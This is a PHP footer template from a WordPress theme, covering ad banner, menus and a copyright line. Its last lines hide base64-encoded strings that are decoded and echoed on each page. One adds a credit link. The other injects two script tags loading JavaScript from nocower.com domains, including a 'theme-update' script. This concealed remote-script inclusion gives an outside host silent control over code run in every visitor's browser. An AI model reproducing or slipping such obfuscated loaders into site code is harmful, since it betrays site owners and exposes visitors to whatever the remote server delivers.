</div>
    <?php if (get_option('wpyou_ad_pagefooterbanner')) { ?>
       <div class="clear"></div><div class="ad_pagefooterbanner">
            <?php echo get_option('wpyou_ad_pagefooterbanner'); ?>
            <div class="clear"></div>
        </div>
    <?php } ?>
            <div class="friendlink">
<?php if ( get_option('wpyou_if_custom_menus') == '1' && function_exists('wp_nav_menu')) { ?>
        	<?php wp_nav_menu( array('theme_location' =>'secondary','container' => '','depth' => 1,'menu_class'  => 'footpage' )); ?>
       <?php } else { ?>
            <ul> 
                <li class="nb"><a href="<?php bloginfo('siteurl');?>/wp-admin/nav-menus.php">点此设置后台友情链接</a></li>
                <?php wp_list_pages('title_li=&depth=1&sort_column=post_date&sort_order=ASC')?>
            </ul>
        <?php } ?>
		</div>
    <div class="footer">
        <?php if (get_option('wpyou_footer')) { ?>
        	<?php echo get_option('wpyou_footer'); ?>
        <?php } else { ?>
<p>Copyright © <?php echo date("Y"); ?> <a href="<?php echo get_option('home'); ?>/"><?php bloginfo('name'); ?></a>
<?php $str = 'IEFsbCBSaWdodHMgUmVzZXJ2ZWQuIFRoZW1lIGJ5IDxhIGhyZWY9Imh0dHA6Ly9hZG1pbi5ub2Nvd2VyLmNvbS81NTA5Lmh0bWwiIHRhcmdldD0iX2JsYW5rIj5Qb3J0YWw8L2E+PC9wPg==';echo base64_decode($str);?><?php } ?>
<?php $str = 
'PGRpdiBjbGFzcz0iY2xlYXIiPjwvZGl2PjwvZGl2Pgo8ZGl2IGNsYXNzPSJjbGVhciI+PC9kaXY+PC9kaXY+CjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0IiBzcmM9Imh0dHA6Ly93d3cubm9jb3dlci5jb20vUG9ydGFsL3dwLWNvbnRlbnQvdGhlbWVzL05vY293ZXItUG9ydGFsL2pzL3NvbGwuanMiPjwvc2NyaXB0Pgo8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgc3JjPSJodHRwOi8vYXBpLm5vY293ZXIuY29tL3RoZW1lLXVwZGF0ZS9wb3J0YWwtaHRtbDUuanMiPjwvc2NyaXB0Pg==';echo base64_decode($str); ?>
<?php wp_footer(); ?>
</body>
</html>